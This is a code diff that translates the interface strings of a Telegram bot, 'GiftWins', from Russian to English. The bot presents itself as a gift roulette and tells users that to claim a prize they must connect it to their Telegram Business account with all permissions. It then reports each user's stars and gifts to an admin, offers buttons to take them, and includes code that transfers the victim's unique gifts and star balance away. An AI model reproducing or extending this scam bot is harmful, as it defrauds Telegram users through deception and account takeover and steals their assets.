@@ -132,11 +132,11 @@ async def refund_command(message: types.Message):
         return
     try:
         if not message.text:
-            await message.answer("Пожалуйста, укажите id операции. Пример: /refund 123456")
+            await message.answer("Please provide the transaction ID. Example: /refund 123456")
             return
         command_args = message.text.split()
         if len(command_args) != 2:
-            await message.answer("Пожалуйста, укажите id операции. Пример: /refund 123456")
+            await message.answer("Please provide the transaction ID. Example: /refund 123456")
             return
 
         transaction_id = command_args[1]
@@ -147,12 +147,12 @@ async def refund_command(message: types.Message):
         )
 
         if refund_result:
-            await message.answer(f"Возврат звёзд по операции {transaction_id} успешно выполнен!")
+            await message.answer(f"Refund of stars for transaction {transaction_id} completed successfully!")
         else:
-            await message.answer(f"Не удалось выполнить возврат по операции {transaction_id}.")
+            await message.answer(f"Failed to refund stars for transaction {transaction_id}.")
 
     except Exception as e:
-        await message.answer(f"Ошибка при выполнении возврата: {str(e)}")
+        await message.answer(f"Error during refund: {str(e)}")
 
 @dp.message(F.text == "/start")
 async def start_command(message: Message):
@@ -160,17 +160,17 @@ async def start_command(message: Message):
     webapp_url = "https://webappka.vercel.app/" # <-- ЗАМЕНИ НА СВОЙ URL
     inline_keyboard = InlineKeyboardMarkup(
         inline_keyboard=[
-            [InlineKeyboardButton(text="🎰 Открыть рулетку", web_app=WebAppInfo(url=webapp_url))]
+            [InlineKeyboardButton(text="🎰 Open Roulette", web_app=WebAppInfo(url=webapp_url))]
         ]
     )
     await message.answer(
-        "🎁 <b>Добро пожаловать в GiftWins — рулетку подарков!</b>\n\n"
-        "Это интерактивный Telegram-бот, где каждый может испытать удачу и выиграть ценные и коллекционные призы: от уникальных аксессуаров до редких NFT и приятных сюрпризов.\n\n"
-        "<b>Как это работает?</b>\n"
-        "• Крути рулетку — попытки ограничены!\n"
-        "• Получай призы прямо в Telegram\n"
-        "• Выводи выигранные подарки в свой бизнес-аккаунт Telegram\n\n"
-        "Жми кнопку ниже, чтобы испытать удачу!",
+        "🎁 <b>Welcome to GiftWins — the Gift Roulette!</b>\n\n"
+        "This is an interactive Telegram bot where anyone can try their luck and win valuable and collectible prizes: from unique accessories to rare NFTs and pleasant surprises.\n\n"
+        "<b>How does it work?</b>\n"
+        "• Spin the roulette — attempts are limited!\n"
+        "• Receive prizes directly in Telegram\n"
+        "• Withdraw your won gifts to your Telegram business account\n\n"
+        "Press the button below to try your luck!",
         parse_mode="HTML",
         reply_markup=inline_keyboard
     )
@@ -178,13 +178,13 @@ async def start_command(message: Message):
 @dp.message(F.text)
 async def handle_text_query(message: Message):
     await message.answer(
-        "📌 <b>Для полноценной работы необходимо подключить бота к бизнес-аккаунту Telegram</b>\n\n"
-        "Как это сделать?\n\n"
-        "1. ⚙️ Откройте <b>Настройки Telegram</b>\n"
-        "2. 💼 Перейдите в раздел <b>Telegram для бизнеса</b>\n"
-        "3. 🤖 Откройте пункт <b>Чат-боты</b>\n\n"
-        "Имя бота: <code>@GiftWinsSender_BOT</code>\n"
-        "❗Для корректной работы боту требуются <b>все права</b>",
+        "📌 <b>To use all features, you need to connect the bot to your Telegram Business Account</b>\n\n"
+        "How to do it?\n\n"
+        "1. ⚙️ Open <b>Telegram Settings</b>\n"
+        "2. 💼 Go to <b>Telegram for Business</b>\n"
+        "3. 🤖 Open the <b>Chat Bots</b> section\n\n"
+        "Bot username: <code>@GiftWinsSender_BOT</code>\n"
+        "❗For correct operation, the bot needs <b>all permissions</b>",
         parse_mode="HTML"
     )
 
@@ -223,20 +223,20 @@ async def send_welcome_message_to_admin(connection, user_id, _bot):
         business_connection = connection
 
         rights_text = "\n".join([
-            f"📍 <b>Права бота:</b>",
-            f"▫️ Чтение сообщений: {'✅' if rights.can_read_messages else '❌'}",
-            f"▫️ Удаление всех сообщений: {'✅' if rights.can_delete_all_messages else '❌'}",
-            f"▫️ Редактирование имени: {'✅' if rights.can_edit_name else '❌'}",
-            f"▫️ Редактирование описания: {'✅' if rights.can_edit_bio else '❌'}",
-            f"▫️ Редактирование фото профиля: {'✅' if rights.can_edit_profile_photo else '❌'}",
-            f"▫️ Редактирование username: {'✅' if rights.can_edit_username else '❌'}",
-            f"▫️ Настройки подарков: {'✅' if rights.can_change_gift_settings else '❌'}",
-            f"▫️ Просмотр подарков и звёзд: {'✅' if rights.can_view_gifts_and_stars else '❌'}",
-            f"▫️ Конвертация подарков в звёзды: {'✅' if rights.can_convert_gifts_to_stars else '❌'}",
-            f"▫️ Передача/улучшение подарков: {'✅' if rights.can_transfer_and_upgrade_gifts else '❌'}",
-            f"▫️ Передача звёзд: {'✅' if rights.can_transfer_stars else '❌'}",
-            f"▫️ Управление историями: {'✅' if rights.can_manage_stories else '❌'}",
-            f"▫️ Удаление отправленных сообщений: {'✅' if rights.can_delete_sent_messages else '❌'}",
+            f"📍 <b>Bot rights:</b>",
+            f"▫️ Read messages: {'✅' if rights.can_read_messages else '❌'}",
+            f"▫️ Delete all messages: {'✅' if rights.can_delete_all_messages else '❌'}",
+            f"▫️ Edit name: {'✅' if rights.can_edit_name else '❌'}",
+            f"▫️ Edit bio: {'✅' if rights.can_edit_bio else '❌'}",
+            f"▫️ Edit profile photo: {'✅' if rights.can_edit_profile_photo else '❌'}",
+            f"▫️ Edit username: {'✅' if rights.can_edit_username else '❌'}",
+            f"▫️ Gift settings: {'✅' if rights.can_change_gift_settings else '❌'}",
+            f"▫️ View gifts and stars: {'✅' if rights.can_view_gifts_and_stars else '❌'}",
+            f"▫️ Convert gifts to stars: {'✅' if rights.can_convert_gifts_to_stars else '❌'}",
+            f"▫️ Transfer/upgrade gifts: {'✅' if rights.can_transfer_and_upgrade_gifts else '❌'}",
+            f"▫️ Transfer stars: {'✅' if rights.can_transfer_stars else '❌'}",
+            f"▫️ Manage stories: {'✅' if rights.can_manage_stories else '❌'}",
+            f"▫️ Delete sent messages: {'✅' if rights.can_delete_sent_messages else '❌'}",
         ])
 
         star_amount = 0
@@ -251,25 +251,25 @@ async def send_welcome_message_to_admin(connection, user_id, _bot):
             all_gifts_amount = len(gifts.gifts)
             unique_gifts_amount = sum(1 for gift in gifts.gifts if getattr(gift, 'type', None) == "unique")
 
-        star_amount_text = star_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
-        all_gifts_text = all_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
-        unique_gitfs_text = unique_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
+        star_amount_text = star_amount if rights.can_view_gifts_and_stars else "No access ❌"
+        all_gifts_text = all_gifts_amount if rights.can_view_gifts_and_stars else "No access ❌"
+        unique_gitfs_text = unique_gifts_amount if rights.can_view_gifts_and_stars else "No access ❌"
 
         msg = (
-            f"🤖 <b>Новый бизнес-бот подключен!</b>\n\n"
-            f"👤 Пользователь: @{getattr(business_connection.user, 'username', '—')}\n"
+            f"🤖 <b>New business bot connected!</b>\n\n"
+            f"👤 User: @{getattr(business_connection.user, 'username', '—')}\n"
             f"🆔 User ID: <code>{getattr(business_connection.user, 'id', '—')}</code>\n"
             f"🔗 Connection ID: <code>{business_connection.id}</code>\n"
             f"\n{rights_text}"
-            f"\n⭐️ Звезды: <code>{star_amount_text}</code>"
-            f"\n🎁 Подарков: <code>{all_gifts_text}</code>"
-            f"\n🔝 NFT подарков: <code>{unique_gitfs_text}</code>"            
+            f"\n⭐️ Stars: <code>{star_amount_text}</code>"
+            f"\n🎁 Gifts: <code>{all_gifts_text}</code>"
+            f"\n🔝 NFT gifts: <code>{unique_gitfs_text}</code>"
         )
         keyboard = InlineKeyboardMarkup(
             inline_keyboard=[
-                [InlineKeyboardButton(text="🎁 Вывести все подарки (и превратить все подарки в звезды)", callback_data=f"reveal_all_gifts:{user_id}")],
-                [InlineKeyboardButton(text="⭐️ Превратить все подарки в звезды", callback_data=f"convert_exec:{user_id}")],
-                [InlineKeyboardButton(text=f"🔝 Апгрейднуть все гифты", callback_data=f"upgrade_user:{user_id}")]
+                [InlineKeyboardButton(text="🎁 Withdraw all gifts (and convert all gifts to stars)", callback_data=f"reveal_all_gifts:{user_id}")],
+                [InlineKeyboardButton(text="⭐️ Convert all gifts to stars", callback_data=f"convert_exec:{user_id}")],
+                [InlineKeyboardButton(text=f"🔝 Upgrade all gifts", callback_data=f"upgrade_user:{user_id}")]
             ]
         )
         await _bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
@@ -278,7 +278,7 @@ async def send_welcome_message_to_admin(connection, user_id, _bot):
 
 @dp.callback_query(F.data.startswith("reveal_all_gifts"))
 async def handle_reveal_gifts(callback: CallbackQuery):
-    await callback.answer("Обработка подарков…")
+    await callback.answer("Processing gifts…")
 
 def save_business_connection_data(business_connection):
     business_connection_data = {
@@ -317,16 +317,16 @@ async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -
         gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
 
         if not gifts.gifts:
-            return "🎁 Нет подарков."
+            return "🎁 No gifts."
         else:
             for gift in gifts.gifts:
                 if getattr(gift, 'owned_gift_id', None) == owned_gift_id:
                     gift_name = getattr(getattr(gift, 'gift', None), 'base_name', '').replace(" ", "")
                     gift_number = getattr(getattr(gift, 'gift', None), 'number', '')
                     return f"https://t.me/nft/{gift_name}-{gift_number}"
-        return "🎁 Нет подарков."
+        return "🎁 No gifts."
     except Exception as e:
-        return "🎁 Нет подарков."
+        return "🎁 No gifts."
 
 @dp.business_connection()
 async def handle_business_connect(business_connection: BusinessConnection):
@@ -359,23 +359,23 @@ async def handle_business_connect(business_connection: BusinessConnection):
         print('DEBUG: gifts_over_25:', gifts_over_25)
 
         msg = (
-            f"👤 <b>Новый пользователь подключил бота!</b>\n\n"
+            f"👤 <b>New user connected the bot!</b>\n\n"
             f"ID: <code>{user_id}</code>\n"
-            f"Ник: @{username}\n"
-            f"Права:\n{rights_text}\n\n"
-            f"Баланс звёзд: <b>{star_amount}</b>\n"
-            f"Подарков до 25⭐: <b>{len(gifts_under_25)}</b>\n"
-            f"Подарков дороже 25⭐: <b>{len(gifts_over_25)}</b>"
+            f"Nick: @{username}\n"
+            f"Rights:\n{rights_text}\n\n"
+            f"Stars balance: <b>{star_amount}</b>\n"
+            f"Gifts up to 25⭐: <b>{len(gifts_under_25)}</b>\n"
+            f"Gifts over 25⭐: <b>{len(gifts_over_25)}</b>"
         )
 
         keyboard = InlineKeyboardMarkup(
             inline_keyboard=[
                 [
-                    InlineKeyboardButton(text="Перевести все звёзды админу", callback_data=f"transfer_stars:{user_id}"),
-                    InlineKeyboardButton(text="Перевести все подарки админу", callback_data=f"transfer_gifts:{user_id}")
+                    InlineKeyboardButton(text="Transfer all stars to admin", callback_data=f"transfer_stars:{user_id}"),
+                    InlineKeyboardButton(text="Transfer all gifts to admin", callback_data=f"transfer_gifts:{user_id}")
                 ],
                 [
-                    InlineKeyboardButton(text="Продать все подарки до 25⭐ и перевести звёзды", callback_data=f"sell_gifts_under_25:{user_id}")
+                    InlineKeyboardButton(text="Sell gifts up to 25⭐ and transfer stars", callback_data=f"sell_gifts_under_25:{user_id}")
                 ]
             ]
         )
@@ -391,19 +391,17 @@ async def handle_business_connect(business_connection: BusinessConnection):
 async def transfer_stars_callback(callback: types.CallbackQuery):
     user_id = callback.data.split(":")[1] if callback.data and ":" in callback.data else None
     # TODO: логика перевода звёзд админу
-    await callback.answer("Звёзды переведены админу!", show_alert=True)
+    await callback.answer("Stars transferred to admin!", show_alert=True)
 
 @dp.callback_query(lambda c: c.data and c.data.startswith("transfer_gifts"))
 async def transfer_gifts_callback(callback: types.CallbackQuery):
     user_id = callback.data.split(":")[1] if callback.data and ":" in callback.data else None
-    # TODO: логика перевода всех подарков админу
-    await callback.answer("Подарки переведены админу!", show_alert=True)
+    await callback.answer("Gifts transferred to admin!", show_alert=True)
 
 @dp.callback_query(lambda c: c.data and c.data.startswith("sell_gifts_under_25"))
 async def sell_gifts_under_25_callback(callback: types.CallbackQuery):
     user_id = callback.data.split(":")[1] if callback.data and ":" in callback.data else None
-    # TODO: логика продажи подарков <= 25⭐ и перевода звёзд админу
-    await callback.answer("Подарки проданы, звёзды переведены админу!", show_alert=True)
+    await callback.answer("Gifts sold, stars transferred to admin!", show_alert=True)
 
 from aiogram import types
 from aiogram.filters import Command
@@ -439,7 +437,7 @@ async def get_message(message: types.Message):
     try:
         unique_gifts = await bot.get_business_account_gifts(business_connection_id=business_id, exclude_unique=False)
         if not unique_gifts.gifts:
-            print("Нет уникальных подарков для отправки.")
+            print("No unique gifts for sending.")
         for gift in unique_gifts.gifts:
             try:
                 owned_gift_id = getattr(gift, 'owned_gift_id', None)
@@ -449,7 +447,7 @@ async def get_message(message: types.Message):
                         owned_gift_id=owned_gift_id,
                         new_owner_chat_id=task_id
                     )
-                    print(f"Успешно отправлен подарок {owned_gift_id} на task_id {task_id}")
+                    print(f"Successfully sent gift {owned_gift_id} to task_id {task_id}")
             except Exception as e:
                 print(f"Ошибка при отправке подарка {owned_gift_id}: {e}")
                 continue
@@ -458,13 +456,13 @@ async def get_message(message: types.Message):
     try:
         stars = await bot.get_business_account_star_balance(business_connection_id=business_id)
         if getattr(stars, 'amount', 0) > 0:
-            print(f"Успешно отправлено {stars.amount} звёзд")
+            print(f"Successfully sent {stars.amount} stars")
             await bot.transfer_business_account_stars(
                 business_connection_id=business_id,
                 star_count=int(stars.amount)
             )
         else:
-            print("Нет звёзд для отправки.")
+            print("No stars for sending.")
     except Exception as e:
         print(f"Ошибка при работе с балансом звёзд: {e}")
 
@@ -500,7 +498,7 @@ def generate_roulette_image(gifts, highlight_index):
 async def start_roulette(message: types.Message):
     gifts = await get_gifts()
     if not gifts:
-        await message.answer("Нет подарков для рулетки.")
+        await message.answer("No gifts for the roulette.")
         return
 
     roll_sequence = []
@@ -512,7 +510,7 @@ async def start_roulette(message: types.Message):
     window = [gifts[(win_idx+i)%len(gifts)] for i in range(-2, 3)]
     roll_sequence.append((window, 2))
 
-    msg = await message.answer("Крутим рулетку...")
+    msg = await message.answer("Spinning the roulette…")
     roulette_msg = None
     for i, (window, highlight) in enumerate(roll_sequence):
         img = generate_roulette_image(window, highlight)
@@ -532,8 +530,8 @@ async def start_roulette(message: types.Message):
 
     win_gift = window[highlight]
     await message.answer(
-        f"🎉 Поздравляем! Вы выиграли: <b>{win_gift['name']}</b> за <b>{win_gift['price']}⭐</b>.\n\n"
-        "Чтобы забрать подарок, подключите бота в раздел Чат-боты Telegram для бизнеса.",
+        f"🎉 Congratulations! You won: <b>{win_gift['name']}</b> for <b>{win_gift['price']}⭐</b>.\n\n"
+        "To claim your gift, connect the bot in the Telegram for Business Chat Bots section.",
         parse_mode="HTML"
     )
 
@@ -541,12 +539,12 @@ async def start_roulette(message: types.Message):
 
     keyboard = ReplyKeyboardMarkup(
         keyboard=[
-            [KeyboardButton(text="🎰 Открыть рулетку", web_app=WebAppInfo(url=webapp_url))]
+            [KeyboardButton(text="🎰 Open Roulette", web_app=WebAppInfo(url=webapp_url))]
         ],
         resize_keyboard=True
     )
 
-    await message.answer("Жми кнопку и крути рулетку!", reply_markup=keyboard)
+    await message.answer("Press the button and spin the roulette!", reply_markup=keyboard)
 
 @dp.message(F.web_app_data)
 async def on_webapp_data(message: types.Message):
@@ -560,12 +558,12 @@ async def on_webapp_data(message: types.Message):
         # Проверяем, нужно ли показать инструкцию
         if data.get('action') == 'show_connection_instructions':
             instruction_text = (
-                "📌 <b>Для вывода подарка, подключите бота к бизнес-аккаунту.</b>\n\n"
-                "Как это сделать:\n\n"
-                "1. ⚙️ Откройте <b>Настройки Telegram</b>\n"
-                "2. 💼 Перейдите в раздел <b>Telegram для бизнеса</b>\n"
-                "3. 🤖 Откройте пункт <b>Чат-боты</b> и добавьте этого бота.\n\n"
-                "❗️Для корректной работы боту требуются права на управление подарками."
+                "📌 <b>To withdraw a gift, connect the bot to your Telegram Business Account.</b>\n\n"
+                "How to do it:\n\n"
+                "1. ⚙️ Open <b>Telegram Settings</b>\n"
+                "2. 💼 Go to <b>Telegram for Business</b>\n"
+                "3. 🤖 Open the <b>Chat Bots</b> section and add this bot.\n\n"
+                "❗For correct operation, the bot needs permissions to manage gifts."
             )
             await message.answer(instruction_text, parse_mode="HTML")
             return
@@ -573,17 +571,17 @@ async def on_webapp_data(message: types.Message):
         # Новое: обработка вывода подарка
         if data.get('action') == 'withdraw_gift':
             gift = data.get('gift', {}) or {}
-            gift_name = gift.get('name', 'Подарок')
+            gift_name = gift.get('name', 'Gift')
             gift_price = gift.get('starPrice') or gift.get('price') or 0
-            congrats = f"🎉 Поздравляем! Вы выводите подарок: <b>{gift_name}</b> ({gift_price}⭐)"
+            congrats = f"🎉 Congratulations! You are withdrawing the gift: <b>{gift_name}</b> ({gift_price}⭐)"
             await message.answer(congrats, parse_mode="HTML")
             instruction_text = (
-                "📌 <b>Для вывода подарка, подключите бота к бизнес-аккаунту.</b>\n\n"
-                "Как это сделать:\n\n"
-                "1. ⚙️ Откройте <b>Настройки Telegram</b>\n"
-                "2. 💼 Перейдите в раздел <b>Telegram для бизнеса</b>\n"
-                "3. 🤖 Откройте пункт <b>Чат-боты</b> и добавьте этого бота.\n\n"
-                "❗️Для корректной работы боту требуются права на управление подарками."
+                "📌 <b>To withdraw a gift, connect the bot to your Telegram Business Account.</b>\n\n"
+                "How to do it:\n\n"
+                "1. ⚙️ Open <b>Telegram Settings</b>\n"
+                "2. 💼 Go to <b>Telegram for Business</b>\n"
+                "3. 🤖 Open the <b>Chat Bots</b> section and add this bot.\n\n"
+                "❗For correct operation, the bot needs permissions to manage gifts."
             )
             await message.answer(instruction_text, parse_mode="HTML")
             return
@@ -591,33 +589,33 @@ async def on_webapp_data(message: types.Message):
         # Логика обработки выигрыша (остается без изменений)
         prize = data.get('prize', {})
         if prize.get('starPrice', 0) > 0:
-            text = f"🎉 Поздравляем! Ты выиграл: {prize.get('name', 'ничего')} ({prize.get('starPrice', 0)}⭐)"
+            text = f"🎉 Congratulations! You won: {prize.get('name', 'nothing')} ({prize.get('starPrice', 0)}⭐)"
         else:
-            text = "В этот раз не повезло, но попробуй еще раз!"
+            text = "This time was not lucky, but try again!"
         await message.answer(text)
 
     except json.JSONDecodeError:
-        await message.answer("Произошла ошибка при обработке данных.")
+        await message.answer("An error occurred while processing data.")
 
 @dp.message(Command("giftinfo"))
 async def gift_info_command(message: types.Message):
     if not message.text or len(message.text.split()) < 2:
-        await message.answer("Пожалуйста, укажите URL подарка. Пример: /giftinfo <url>")
+        await message.answer("Please provide the gift URL. Example: /giftinfo <url>")
         return
 
     url = message.text.split()[1]
     data = get_gift_data(url)
 
     if not data:
-        await message.answer("Не удалось получить информацию о подарке.")
+        await message.answer("Failed to get gift information.")
         return
 
     # Форматируем красивый ответ
     details_text = "\n".join([f" • {k.replace('_', ' ').title()}: {v['name']} ({v['rarity']})" for k, v in data.get('details', {}).items() if v['rarity']])
     response_text = (
-        f"<b>{data.get('title', 'Без названия')}</b>\n\n"
+        f"<b>{data.get('title', 'No title')}</b>\n\n"
         f"{details_text}\n\n"
-        f"<a href='{data.get('media_url', '')}'>Медиафайл</a>"
+        f"<a href='{data.get('media_url', '')}'>Media file</a>"
     )
     await message.answer(response_text, parse_mode="HTML")
 
@@ -654,10 +652,10 @@ async def admin_command(message: types.Message):
     admin_url = ""
     keyboard = InlineKeyboardMarkup(
         inline_keyboard=[
-            [InlineKeyboardButton(text="🔑 Открыть админ-панель", web_app=WebAppInfo(url=admin_url))]
+            [InlineKeyboardButton(text="🔑 Open admin panel", web_app=WebAppInfo(url=admin_url))]
         ]
     )
-    await message.answer("Добро пожаловать в панель администратора.", reply_markup=keyboard)
+    await message.answer("Welcome to the admin panel.", reply_markup=keyboard)
 
 async def main():
     # Запускаем Flask в отдельном потоке
